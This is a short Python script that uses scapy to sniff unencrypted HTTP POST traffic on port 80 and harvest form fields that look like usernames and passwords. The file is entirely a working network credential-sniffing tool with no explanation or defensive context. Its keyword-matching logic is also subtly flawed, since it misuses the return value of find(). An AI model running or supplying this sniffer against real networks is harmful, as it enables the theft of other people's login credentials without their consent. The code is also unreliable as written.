from scapy.all import *
from scapy_http import http
from colorama import init, Fore

init()

def callback(packet):
    if packet.haslayer(http.HTTPRequest):
        url = getUrl(packet)
        print(Fore.GREEN + "[+]" + Fore.RESET + " Http Request >> " + Fore.CYAN + url + Fore.RESET)
        credentials = getCreds(packet)
        if credentials:
            print(Fore.GREEN + "[+]" + Fore.RESET + " |--> Possible username/password found !")
            print(Fore.GREEN + "[+]" + Fore.RESET + " |--> " + Fore.LIGHTRED_EX + str(credentials) + Fore.RESET + "\n")

def getUrl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def getCreds(packet):
    if packet.haslayer(Raw):
        load = packet.getlayer(Raw).load
        load = load.split("&")
        res = []
        keywords = ["login", "password", "username", "user", "pass","utilisateur","passe"]
        for param in load:
            trigger = True
            for keyword in keywords:
                if (param.find(keyword) and trigger):
                    res.append(param)
                    trigger = False
        return res

sniff(prn=callback, filter="tcp port 80",lfilter=lambda p: "POST" in str(p), store=0)